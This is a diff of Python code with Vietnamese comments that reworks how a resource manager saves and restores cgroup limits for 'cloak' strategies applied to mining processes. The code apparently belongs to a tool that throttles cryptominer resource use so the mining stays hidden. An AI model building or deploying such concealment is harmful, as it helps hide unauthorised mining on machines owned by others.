@@ -87,7 +87,6 @@ class SharedResourceManager:
         self.config = config
         self.logger = logger
         self.cgroup_manager = cgroup_manager
-        self.original_resource_limits = {}
         self.gpu_manager = GPUManager()
         self.power_manager = PowerManager()
         self.strategy_cache = {}  # Thêm cache cho chiến lược
@@ -197,11 +196,6 @@ class SharedResourceManager:
                     self.logger.error(f"Controller '{controller}' không được định nghĩa trong cgroups cấu hình: {cgroups}")
                     return
 
-            # Lưu trữ giới hạn tài nguyên ban đầu nếu chưa được lưu
-            if pid not in self.original_resource_limits:
-                self.original_resource_limits[pid] = {}
-                self.store_original_limits(strategy_name, cgroups, process)
-
             self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
@@ -221,7 +215,7 @@ class SharedResourceManager:
             self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
             strategy.apply(process, cgroups)  # Các điều chỉnh tài nguyên được thực hiện trực tiếp bởi strategy
             self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")
-
+            
         except psutil.NoSuchProcess as e:
             self.logger.error(f"Tiến trình không tồn tại: {e}")
         except psutil.AccessDenied as e:
@@ -232,65 +226,9 @@ class SharedResourceManager:
             )
             raise
 
-    def store_original_limits(self, strategy_name: str, cgroups: Dict[str, str], process: MiningProcess):
-        """
-        Lưu trữ giới hạn tài nguyên ban đầu cho chiến lược cloaking cụ thể.
-
-        Args:
-            strategy_name (str): Tên của chiến lược cloaking.
-            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
-            process (MiningProcess): Đối tượng tiến trình khai thác.
-        """
-        try:
-            pid = process.pid
-            if strategy_name == 'cpu':
-                current_quota = self.resource_managers['cpu'].get_cpu_quota(cgroups['cpu'])
-                self.original_resource_limits[pid]['cpu_cloak'] = {
-                    'cgroup': cgroups['cpu'],
-                    'cpu_max': current_quota
-                }
-
-            elif strategy_name == 'gpu':
-                current_gpu_params = self.resource_managers['gpu'].get_gpu_parameters(cgroups['gpu'])
-                self.original_resource_limits[pid]['gpu_cloak'] = {
-                    'cgroup': cgroups['gpu'],
-                    'gpu_params': current_gpu_params
-                }
-
-            elif strategy_name == 'memory':
-                current_ram = self.resource_managers['memory'].get_memory_limit(cgroups['memory'])
-                self.original_resource_limits[pid]['memory_cloak'] = {
-                    'cgroup': cgroups['memory'],
-                    'memory_limit': current_ram
-                }
-
-            elif strategy_name == 'cache':
-                current_cache = self.resource_managers['cache'].get_cache_limit(cgroups['cache'])
-                self.original_resource_limits[pid]['cache_cloak'] = {
-                    'cgroup': cgroups['cache'],
-                    'cache_limit': current_cache
-                }
-
-            elif strategy_name == 'network':
-                current_network = self.resource_managers['network'].get_network_bandwidth(cgroups['network'])
-                self.original_resource_limits[pid]['network_cloak'] = {
-                    'cgroup': cgroups['network'],
-                    'network_bandwidth': current_network
-                }
-
-            elif strategy_name == 'io':
-                current_io = self.resource_managers['io'].get_io_weight(cgroups['io'])
-                self.original_resource_limits[pid]['io_cloak'] = {
-                    'cgroup': cgroups['io'],
-                    'io_weight': current_io
-                }
-
-        except Exception as e:
-            self.logger.error(f"Lỗi khi lưu giới hạn ban đầu cho chiến lược '{strategy_name}': {e}\n{traceback.format_exc()}")
-
     def restore_resources(self, process: MiningProcess):
         """
-        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách sử dụng các chiến lược cloaking để khôi phục các giới hạn tài nguyên.
+        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách xóa các cgroup đang giới hạn tài nguyên đó.
 
         Args:
             process (MiningProcess): Đối tượng tiến trình khai thác.
@@ -298,42 +236,33 @@ class SharedResourceManager:
         try:
             pid = process.pid
             name = process.name
-            orig_limits = self.original_resource_limits.get(pid)
-            if not orig_limits:
-                self.logger.warning(
-                    f"Không thấy original_limits cho {name} (PID: {pid})."
-                )
-                return
+            cgroups = self.config.get('cgroups', {})
+            controllers = ['cpu', 'gpu', 'memory', 'cache', 'network', 'io']
+            restored = False
 
-            # Khôi phục các giới hạn tài nguyên từ original_resource_limits
-            for strategy_key, limits in orig_limits.items():
-                if strategy_key.endswith('_cloak'):
-                    strategy_name = strategy_key.split('_')[0]  # 'cpu', 'gpu', etc.
-                    strategy = CloakStrategyFactory.create_strategy(
-                        strategy_name,
-                        self.config,
-                        self.logger,
-                        self.cgroup_manager,
-                        self.resource_managers
-                    )
-                    if strategy and callable(getattr(strategy, 'restore', None)):
-                        self.logger.info(f"Khôi phục chiến lược '{strategy_name}' cho {name} (PID: {pid})")
-                        strategy.restore(process, limits)
+            # Kiểm tra và xóa từng cgroup liên quan đến tiến trình
+            for controller in controllers:
+                cgroup_name = cgroups.get(controller, f"{controller}_cloak_{pid}")
+                if self.cgroup_manager.cgroup_exists(cgroup_name):
+                    success = self.resource_managers[controller].delete_cgroup(cgroup_name)
+                    if success:
+                        self.logger.info(f"Đã xóa cgroup '{cgroup_name}' cho PID={pid}.")
+                        restored = True
                     else:
-                        self.logger.error(f"Không thể khôi phục chiến lược '{strategy_name}' cho {name} (PID: {pid})")
+                        self.logger.error(f"Không thể xóa cgroup '{cgroup_name}' cho PID={pid}.")
 
-            # Xóa trạng thái ban đầu
-            del self.original_resource_limits[pid]
-            self.logger.info(
-                f"Khôi phục xong tài nguyên cho {name} (PID: {pid})."
-            )
-        except psutil.NoSuchProcess as e:
-            self.logger.error(f"Tiến trình không tồn tại khi khôi phục: {e}")
-        except psutil.AccessDenied as e:
-            self.logger.error(f"Không đủ quyền để khôi phục cloaking cho PID {process.pid}: {e}")
+            if restored:
+                self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID: {pid}).")
+            else:
+                self.logger.warning(f"Không tìm thấy cgroup nào để xóa cho {name} (PID: {pid}).")
+
+        except psutil.NoSuchProcess:
+            self.logger.error(f"Tiến trình PID={pid} không tồn tại khi khôi phục tài nguyên.")
+        except psutil.AccessDenied:
+            self.logger.error(f"Không đủ quyền để khôi phục tài nguyên cho PID={pid}.")
         except Exception as e:
             self.logger.error(
-                f"Lỗi khi khôi phục cloaking cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
+                f"Lỗi khi khôi phục tài nguyên cho tiến trình {name} (PID: {pid}): {e}\n{traceback.format_exc()}"
             )
             raise
 
@@ -410,9 +339,9 @@ class ResourceManager(BaseManager):
         # Xóa các cgroup đã tạo nếu cần
         for proc in self.mining_processes:
             for controller in ['cpu', 'gpu', 'cache', 'network', 'io']:
-                cgroup_name = f"{controller}_cloak_{proc.pid}"
+                cgroup_name = self.config.get('cgroups', {}).get(controller, f"{controller}_cloak_{proc.pid}")
                 try:
-                    self.resource_managers[controller].delete_cgroup(cgroup_name)
+                    self.shared_resource_manager.resource_managers[controller].delete_cgroup(cgroup_name)
                     self.logger.info(f"Xóa cgroup '{cgroup_name}' cho PID={proc.pid}.")
                 except Exception as e:
                     self.logger.error(f"Lỗi khi xóa cgroup '{cgroup_name}' cho PID={proc.pid}: {e}")
@@ -795,7 +724,9 @@ class ResourceManager(BaseManager):
             cache_l = self.shared_resource_manager.get_process_cache_usage(process.pid) 
 
             # Lấy metrics memory nếu cần
-            memory_limit_mb = self.resource_managers['memory'].get_memory_limit(process.pid) / (1024**2) if self.resource_managers.get('memory') else 0.0
+            memory_limit_mb = self.shared_resource_manager.resource_managers['memory'].get_memory_limit(
+                self.config.get('cgroups', {}).get('memory', f"memory_cloak_{process.pid}")
+            ) / (1024**2) if self.shared_resource_manager.resource_managers.get('memory') else 0.0
 
             metrics = {
                 'cpu_usage_percent': float(cpu_pct),
@@ -872,9 +803,9 @@ class ResourceManager(BaseManager):
         # Xóa các cgroup đã tạo nếu cần
         for proc in self.mining_processes:
             for controller in ['cpu', 'gpu', 'cache', 'network', 'io']:
-                cgroup_name = f"{controller}_cloak_{proc.pid}"
+                cgroup_name = self.config.get('cgroups', {}).get(controller, f"{controller}_cloak_{proc.pid}")
                 try:
-                    self.resource_managers[controller].delete_cgroup(cgroup_name)
+                    self.shared_resource_manager.resource_managers[controller].delete_cgroup(cgroup_name)
                     self.logger.info(f"Xóa cgroup '{cgroup_name}' cho PID={proc.pid}.")
                 except Exception as e:
                     self.logger.error(f"Lỗi khi xóa cgroup '{cgroup_name}' cho PID={proc.pid}: {e}")
